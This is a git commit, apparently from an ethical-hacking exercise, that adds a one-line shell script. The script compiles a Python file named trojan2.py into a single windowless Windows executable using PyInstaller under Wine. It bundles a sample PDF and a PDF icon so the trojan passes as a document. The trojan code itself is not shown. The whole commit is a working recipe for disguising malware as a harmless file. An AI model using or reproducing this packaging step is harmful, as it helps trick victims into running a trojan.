69c696ac4d0e7569ad39bcba6c5ee52ab2fc3920
Ben Robbins <benro2211@gmail.com>
2022-04-07 00:21:38 -0400

    example shell script to build exe

---
+++ makeExe.sh
@@ -0,0 +1,1 @@
+wine /root/.wine/drive_c/WineThon/Scripts/pyinstaller.exe /root/Documents/Ethical_hacking/trojan2.py --onefile --noconsole --add-data '/root/transfers/sample.pdf;.' -i /root/transfers/pdf.ico
